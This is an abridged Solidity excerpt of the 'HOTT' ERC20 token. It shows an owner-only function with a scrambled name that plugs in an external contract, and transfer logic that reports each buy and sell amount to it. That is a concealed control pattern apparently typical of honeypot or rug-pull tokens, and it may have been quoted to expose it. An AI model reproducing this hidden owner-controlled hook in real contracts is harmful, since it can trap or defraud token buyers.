...
contract TokenM is ERC20 {
    ...
    OTvceAmountpoerni public poerni;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("HOTT", "HOTT") {
    ...
    function oiduchuNanterKdjke(OTvceAmountpoerni _poerni) public onlyOwner {
        poerni = _poerni;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                poerni.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				poerni.addOutAmount(from, amount);
            }else{
                poerni.addOutAmount(from, amount);
                takeFee = false;
            }
